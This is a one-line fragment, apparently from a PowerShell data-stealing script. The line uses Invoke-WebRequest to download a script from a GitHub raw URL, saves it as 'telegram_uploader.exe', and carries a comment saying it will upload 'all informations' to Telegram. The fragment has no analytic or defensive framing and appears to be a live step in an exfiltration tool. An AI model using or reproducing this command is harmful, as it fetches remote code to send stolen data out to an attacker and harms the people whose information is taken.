...
Invoke-WebRequest https://raw.githubusercontent.com/mrdamfur/key/main/ciaoV2_upload.ps1 -OutFile telegram_uploader.exe #Download uploader file to upload all informations on telegram
